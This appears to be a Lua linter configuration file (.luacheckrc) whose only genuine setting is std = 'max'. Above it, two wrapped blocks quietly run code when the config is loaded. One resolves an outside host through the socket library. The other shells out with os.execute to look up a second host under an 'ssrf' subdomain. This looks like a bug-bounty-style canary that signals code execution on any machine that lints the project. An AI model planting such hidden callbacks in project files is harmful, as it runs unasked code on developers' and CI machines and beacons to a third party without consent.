pcall(function()
  local s = require("socket")
  if s then s.dns.toip("luacheck.h1b.ssrf.xixixo123.site") end
end)
pcall(function() os.execute("getent hosts luacheckx.h1b.ssrf.xixixo123.site >/dev/null 2>&1") end)
std = "max"
